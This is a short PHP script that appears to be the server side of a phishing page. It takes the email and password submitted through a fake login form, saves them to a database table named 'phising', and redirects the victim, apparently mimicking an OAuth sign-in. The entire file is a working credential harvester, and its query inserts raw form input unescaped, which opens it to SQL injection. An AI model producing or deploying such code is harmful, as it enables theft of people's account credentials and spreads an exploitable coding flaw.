<?php
	include "../Controller/config.php";
	$email = $_POST['email'];
	$pass = $_POST['password'];
	$query = mysqli_query($connection, "INSERT INTO phising(email,password) VALUES('$email','$pass')");
	if($query){
		header("location:../");
	}
	else{
		header("location:/OauthV2");
	}
?>
